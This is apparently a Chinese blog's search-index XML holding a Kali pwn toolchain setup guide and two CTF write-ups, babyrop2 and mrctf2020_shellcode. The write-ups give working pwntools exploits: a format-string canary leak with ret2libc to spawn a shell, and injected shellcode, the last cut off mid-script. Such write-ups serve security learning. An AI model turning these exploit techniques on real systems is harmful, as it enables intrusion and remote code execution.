<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Kali Pwn 环境配置</title>
      <link href="/2024/09/01/Kali-Pwn-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/09/01/Kali-Pwn-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<pre><code>以下所有配置在 root 模式下进行</code></pre><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apt</span><br><span class="line">cp sources.list sources.list.bak</span><br><span class="line">vim sources.list</span><br></pre></td></tr></table></figure><p>写入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"># 阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"># 清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"># 浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"># 东软大学</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line"># 重庆大学</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>并将原来 kali 的源注释掉</p><h2 id="更新软件"><a href="#更新软件" class="headerlink" title="更新软件"></a>更新软件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update          #更新索引</span><br><span class="line">apt-get upgrade         #更新软件</span><br><span class="line">apt-get dist-upgrade    #升级</span><br><span class="line">apt-get clean           #删除缓存包</span><br><span class="line">apt-get autoclean       #删除未安装的deb包</span><br></pre></td></tr></table></figure><h2 id="设置锁屏时间"><a href="#设置锁屏时间" class="headerlink" title="设置锁屏时间"></a>设置锁屏时间</h2><p>点击右上角的电源图标</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240901085834.png" alt="image.png"></p><p>选择 <code>Settings</code></p><p>在设置里选择 <code>Security</code> 并将 <code>Automatically lock the session</code> 设置为 <code>Never</code></p><h2 id="安装-gdb-及其插件"><a href="#安装-gdb-及其插件" class="headerlink" title="安装 gdb 及其插件"></a>安装 gdb 及其插件</h2><h5 id="安装-gdb"><a href="#安装-gdb" class="headerlink" title="安装 gdb"></a>安装 gdb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install gdb</span><br></pre></td></tr></table></figure><h5 id="安装-peda"><a href="#安装-peda" class="headerlink" title="安装 peda"></a>安装 peda</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git</span><br><span class="line">cd /etc/gdb</span><br><span class="line">echo &quot;source home/kali/Tools/gdb/peda/peda.py&quot; &gt;&gt; ./gdbinit</span><br></pre></td></tr></table></figure><p>测试时发现报错</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Python Exception &lt;class &#x27;ModuleNotFoundError&#x27;&gt;: No module named &#x27;six.moves&#x27; /etc/gdb/gdbinit:8: Error in sourced command file: Error occurred in Python: No module named &#x27;six.moves&#x27;</span><br></pre></td></tr></table></figure><p>感谢这篇 <a href="https://blog.csdn.net/qq_51886509/article/details/141227182">博客</a> ，终于是找到解决方法</p><p>具体原因里面已经讲的比较清楚了，这里就贴一下解决方案</p><p>首先安装 python12 并替换软链接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install python3.12</span><br><span class="line">ln -sf $(which python3.12) /usr/bin/python</span><br><span class="line">ln -sf $(which python3.12) /usr/bin/python</span><br></pre></td></tr></table></figure><p>然后替换备份 six 模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv /home/kali/Tools/gdb/peda/lib/six.py /home/kali/Tools/gdb/peda/lib/six.py.bak</span><br></pre></td></tr></table></figure><p>再次启动 gdb ，成功将 peda 插件插入</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240901105212.png" alt="image.png"></p><h5 id="安装-pwndbg"><a href="#安装-pwndbg" class="headerlink" title="安装 pwndbg"></a>安装 pwndbg</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd ./pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>但是 Poetry 下载不知为何很慢，所以直接 curl 下载</p><p>再进行将其配置到环境变量中</p><p>先确定 shell （一般是 Zsh ）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc # Zsh</span><br><span class="line">vim ~/.bashrc # Bash</span><br></pre></td></tr></table></figure><p>打开后添加</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=&quot;/home/kali/.local/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><p>然后使更改立即生效</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.zshrc # Zsh</span><br><span class="line">source ~/.bashrc # Bash</span><br></pre></td></tr></table></figure><p>最后检查 Poetry 是否安装成功</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">poetry --version</span><br></pre></td></tr></table></figure><p>成功安装后再运行 </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><p>升级 pip</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>安装 pwntools</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install pwntools-i http://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><p>测试是否完成安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python                                                                                                   </span><br><span class="line">Python 3.12.4 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; asm(<span class="string">&quot;xor eax, ebx&quot;</span>)</span></span><br><span class="line">b&#x27;1\xd8&#x27;</span><br></pre></td></tr></table></figure><h2 id="安装-ROPgadget"><a href="#安装-ROPgadget" class="headerlink" title="安装 ROPgadget"></a>安装 ROPgadget</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3-capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><h2 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure><h2 id="安装-glibc-all-in-one"><a href="#安装-glibc-all-in-one" class="headerlink" title="安装 glibc-all-in-one"></a>安装 glibc-all-in-one</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line">sudo python3 update_list</span><br></pre></td></tr></table></figure><h2 id="安装-patchelf"><a href="#安装-patchelf" class="headerlink" title="安装 patchelf"></a>安装 patchelf</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf/</span><br><span class="line">apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bjdctf_2020_babyrop2</title>
      <link href="/2024/09/01/bjdctf-2020-babyrop2/"/>
      <url>/2024/09/01/bjdctf-2020-babyrop2/</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先使用 <code>checksec</code> 检查</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# checksec ./bjdctf_2020_babyrop2                    </span><br><span class="line">[*] &#x27;/home/kali/Desktop/bjdctf_2020_babyrop2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现是 64 位小端序，开启了 Canary 保护和 NX 保护</p><p>使用 IDA Pro 查看</p><p><code>main</code> 函数非常简单，是其他三个函数的调用，分别进入查看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gift();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>init</code> 函数只是在进行初始设置，没有输入点，但是提示我们使用 <code>ret2libc</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can u return to libc ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try u best!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gift</code> 函数存在输入输出，但是输入只能输入 6 个字符，不是栈溢出，根据变量名 <code>format</code> 可以猜测这里需要使用格式化字符串用于得到 canary 的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> 函数是比较常见的栈溢出的标准格式，一个能过多输入的变量 <code>buf</code> ，非常明显的信号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么总体的解题思路是这样的</p><p>首先通过 <code>gift</code> 函数的格式化字符串漏洞，得到 canary 的值，方便之后利用栈溢出</p><p>在 <code>vuln</code> 函数中，先溢出 <code>puts</code> 函数的 <code>plt</code> 地址，利用 LibcSearcher 得到 <code>libc</code> 的版本，并将返回地址改为 <code>vuln</code> 函数的地址，实现再次利用</p><p>通过 <code>libc</code> 获取 <code>system</code> 函数和 <code>&#39;/bin/sh&#39;</code> 字符串的地址，最终实现 <code>getshell</code></p><h4 id="泄露-canary-值"><a href="#泄露-canary-值" class="headerlink" title="泄露 canary 值"></a>泄露 canary 值</h4><p>canary 值可以使用在 <code>gift</code> 函数中的格式化字符串漏洞得到，而在此之前，需要先确定输入点在栈上的偏移量</p><p>因为一次只能输入 6 个字符，所以不能直接一大串的 <code>aaaa%p%p%p%p...</code> ，只能通过 <code>aa%n$p</code> 去寻找偏移，其中 <code>n</code> 是偏移量的具体数值</p><p>通过不断尝试，得到偏移量为 6 （如何确定是否是正确的偏移量，只需要看输出的结尾是否是 <code>6161</code> ，也即 <code>aa</code> 的 ASCII 码）</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240901155058.png" alt="image.png"></p><p>然后需要寻找 canary 在栈中的位置，也即和输入点的偏移</p><p>使用 gdb 打开程序，现在 <code>gift</code> 函数处下一个断点</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">b *gift</span><br></pre></td></tr></table></figure><p>然后直接运行，可以看到在 <code>rbp+0x8</code> 处有一个 <code>00</code> 结尾的十六进制数据，这就是 canary 的值，继续运行到输入之后，可以看到它在栈中的位置就是输入数据的下一个数据，所以它的偏移量为 7</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 20</span></span><br><span class="line">00:0000│ rsp 0x7fffffffe160 ◂— 0x702436256161 /* &#x27;aa%6$p&#x27; */</span><br><span class="line">01:0008│-008 0x7fffffffe168 ◂— 0x98e0ef082e2f3d00</span><br><span class="line">02:0010│ rbp 0x7fffffffe170 —▸ 0x7fffffffe190 ◂— 1</span><br><span class="line">03:0018│+008 0x7fffffffe178 —▸ 0x400905 (main+43) ◂— mov eax, 0</span><br><span class="line">04:0020│+010 0x7fffffffe180 ◂— 0</span><br><span class="line">05:0028│+018 0x7fffffffe188 ◂— 0x98e0ef082e2f3d00</span><br><span class="line">06:0030│+020 0x7fffffffe190 ◂— 1</span><br><span class="line">07:0038│+028 0x7fffffffe198 —▸ 0x7ffff7deec8a (__libc_start_call_main+122) ◂— mov edi, eax</span><br><span class="line">08:0040│+030 0x7fffffffe1a0 ◂— 0</span><br><span class="line">09:0048│+038 0x7fffffffe1a8 —▸ 0x4008da (main) ◂— push rbp</span><br><span class="line">0a:0050│+040 0x7fffffffe1b0 ◂— 0x100000000</span><br><span class="line">0b:0058│+048 0x7fffffffe1b8 —▸ 0x7fffffffe2a8 —▸ 0x7fffffffe567 ◂— &#x27;/home/kali/Desktop/bjdctf_2020_babyrop2&#x27;</span><br><span class="line">0c:0060│+050 0x7fffffffe1c0 —▸ 0x7fffffffe2a8 —▸ 0x7fffffffe567 ◂— &#x27;/home/kali/Desktop/bjdctf_2020_babyrop2&#x27;</span><br><span class="line">0d:0068│+058 0x7fffffffe1c8 ◂— 0x386fc50188e0c809</span><br><span class="line">0e:0070│+060 0x7fffffffe1d0 ◂— 0</span><br><span class="line">0f:0078│+068 0x7fffffffe1d8 —▸ 0x7fffffffe2b8 —▸ 0x7fffffffe58f ◂— &#x27;COLORTERM=truecolor&#x27;</span><br><span class="line">10:0080│+070 0x7fffffffe1e0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0</span><br><span class="line">11:0088│+078 0x7fffffffe1e8 ◂— 0</span><br><span class="line">12:0090│+080 0x7fffffffe1f0 ◂— 0xc7903afe4ba2c809</span><br><span class="line">13:0098│+088 0x7fffffffe1f8 ◂— 0xc7902abc5066c809</span><br></pre></td></tr></table></figure><p>这样就得到了 canary 的值</p><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>已经知道了 canary ，那么接下来就可以构造栈溢出实现 <code>ret2libc</code> 了</p><p>通过构造的栈溢出泄露 <code>puts</code> 函数的 <code>plt</code> 地址，通过 LibcSearcher 查找对应的 <code>libc</code> 库，从而得到 <code>system</code> 函数的地址和 <code>/bin/sh</code> 字符串的地址，进而实现 `getshell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python 3.12.4</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">binname = <span class="string">&#x27;bjdctf_2020_babyrop2&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(binname)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26505</span>)</span><br><span class="line">elf = ELF(binname)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi_addr = <span class="number">0x0000000000400993</span></span><br><span class="line">vuln_addr = <span class="number">0x0000000000400887</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;I\&#x27;ll give u some gift to help u!&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x8</span> + p64(poprdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr) </span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Pull up your sword and tell me u story!&#x27;</span>, payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x8</span> + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Pull up your sword and tell me u story!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>首先需要注意要获得 canary 的值，然后才能进行接下来的一系列操作</li><li>格式化字符串漏洞需要大胆地调试才能得到实际的偏移，方便我们利用</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> ret2libc </tag>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mrctf2020_shellcode</title>
      <link href="/2024/08/29/mrctf2020-shellcode/"/>
      <url>/2024/08/29/mrctf2020-shellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先使用 <code>checksec</code> 检查</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ checksec ./mrctf2020_shellcode </span><br><span class="line">[*] &#x27;/home/kali/桌面/mrctf2020_shellcode&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>发现是 64 位小端序，开启了 RELRO 保护和 PIE 保护，但是栈可执行，可以考虑使用 <code>ret2shellcode</code></p><p>使用 IDA Pro 查看</p><p>发现 <code>main</code> 函数不能反编译，那就直接看汇编</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001155</span> ; <span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">.text:0000000000001155                 public main</span><br><span class="line">.text:0000000000001155 main            proc near               ; DATA XREF: _start+<span class="number">1</span>D↑o</span><br><span class="line">.text:<span class="number">0000000000001155</span></span><br><span class="line">.text:<span class="number">0000000000001155</span> buf             = byte ptr <span class="number">-410</span>h</span><br><span class="line">.text:<span class="number">0000000000001155</span> var_4           = dword ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">0000000000001155</span></span><br><span class="line">.text:<span class="number">0000000000001155</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001155</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000001156</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001159</span>                 sub     rsp, <span class="number">410</span>h</span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     rax, cs:<span class="built_in">stdin</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">0000000000001167</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">000000000000116</span>C                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">000000000000116F</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">0000000000001174</span>                 mov     rax, cs:<span class="built_in">stdout</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">000000000000117B</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">0000000000001183</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     rax, cs:<span class="built_in">stderr</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">000000000000118F</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">0000000000001194</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">0000000000001197</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">000000000000119</span>C                 lea     rdi, s          ; <span class="string">&quot;Show me your magic!&quot;</span></span><br><span class="line">.text:<span class="number">00000000000011</span>A3                 call    _puts</span><br><span class="line">.text:<span class="number">00000000000011</span>A8                 lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">00000000000011</span>AF                 mov     edx, <span class="number">400</span>h       ; nbytes</span><br><span class="line">.text:<span class="number">00000000000011B</span>4                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">00000000000011B</span>7                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">.text:<span class="number">00000000000011B</span>C                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011</span>C1                 call    _read</span><br><span class="line">.text:<span class="number">00000000000011</span>C6                 mov     [rbp+var_4], eax</span><br><span class="line">.text:<span class="number">00000000000011</span>C9                 cmp     [rbp+var_4], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011</span>CD                 jg      <span class="type">short</span> loc_11D6</span><br><span class="line">.text:<span class="number">00000000000011</span>CF                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011</span>D4                 jmp     <span class="type">short</span> locret_11E4</span><br><span class="line">.text:<span class="number">00000000000011</span>D6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000000011</span>D6</span><br><span class="line">.text:<span class="number">00000000000011</span>D6 loc_11D6:                               ; CODE XREF: main+<span class="number">78</span>↑j</span><br><span class="line">.text:<span class="number">00000000000011</span>D6                 lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">00000000000011</span>DD                 call    rax</span><br><span class="line">.text:<span class="number">00000000000011</span>DF                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011E4</span></span><br><span class="line">.text:<span class="number">00000000000011E4</span> locret_11E4:                            ; CODE XREF: main+<span class="number">7F</span>↑j</span><br><span class="line">.text:<span class="number">00000000000011E4</span>                 leave</span><br><span class="line">.text:<span class="number">00000000000011E5</span>                 retn</span><br><span class="line">.text:<span class="number">00000000000011E5</span> ; &#125; <span class="comment">// starts at 1155</span></span><br><span class="line">.text:<span class="number">00000000000011E5</span> main            endp</span><br></pre></td></tr></table></figure><p><code>main</code> 函数非常简单，先输出 <code>&quot;Show me your magic!&quot;</code> 字符串，然后需要进行输入，之后再跳到 <code>loc_11D6</code> 处执行，主要需要分析 <code>loc_11D6</code> 处</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000000011</span>D6 loc_11D6:                               ; CODE XREF: main+<span class="number">78</span>↑j</span><br><span class="line">.text:<span class="number">00000000000011</span>D6                 lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">00000000000011</span>DD                 call    rax</span><br><span class="line">.text:<span class="number">00000000000011</span>DF                 mov     eax, <span class="number">0</span></span><br></pre></td></tr></table></figure><p><code>loc_11D6</code> 处先将输入的地址，即栈中 <code>buf</code> 位置，传递给 <code>rax</code> 寄存器，然后 <code>call rax</code> ， <code>call</code> 指令可以理解为先 <code>jmp</code> 过去执行，执行完再返回到 <code>call</code> 指令的下一条指令</p><p>所以这里思路非常简单，在输入的时候输入 <code>shellcode</code> ，由于栈可执行，所以在之后 <code>call rax</code> 时会执行输入的 <code>shellcode</code> ，之后再返回执行其他语句。可以直接通过 pwntools 生成 <code>shellcode</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3.11.6</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binname = <span class="string">&#x27;mrctf2020_shellcode&#x27;</span>context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(binname)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28675</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(shellcode)</span><br><span 